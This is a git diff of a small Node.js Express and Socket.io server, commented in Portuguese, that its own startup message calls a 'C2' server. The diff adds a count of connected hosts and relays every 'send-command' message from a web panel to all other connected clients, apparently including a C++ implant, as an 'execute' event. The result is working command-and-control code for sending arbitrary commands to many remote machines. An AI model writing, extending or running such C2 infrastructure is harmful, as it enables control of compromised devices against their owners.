@@ -6,27 +6,31 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
-// Serve o painel HTML
+let activeHosts = new Set();
+
 app.get('/', (req, res) => {
     res.sendFile(__dirname + '/index.html');
 });
 
+function updateHostCount() {
+    // Retorna o total de sockets conectados
+    const count = io.engine.clientsCount;
+    io.emit('host-count', count);
+}
+
 io.on('connection', (socket) => {
     console.log('Novo dispositivo conectado:', socket.id);
+    updateHostCount(); // Atualiza ao conectar
 
-    // Quando você clica no botão do site, ele envia 'send-command'
     socket.on('send-command', (data) => {
-        console.log('Comando recebido do painel:', data);
-        // Repassa o comando para TODOS os outros conectados (incluindo o C++)
         socket.broadcast.emit('execute', data);
     });
 
     socket.on('disconnect', () => {
         console.log('Dispositivo desconectado');
+        updateHostCount(); // Atualiza ao desconectar
     });
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(`Servidor rodando na porta ${PORT}`);
-});
+server.listen(PORT, () => console.log(`Servidor C2 rodando na porta ${PORT}`));
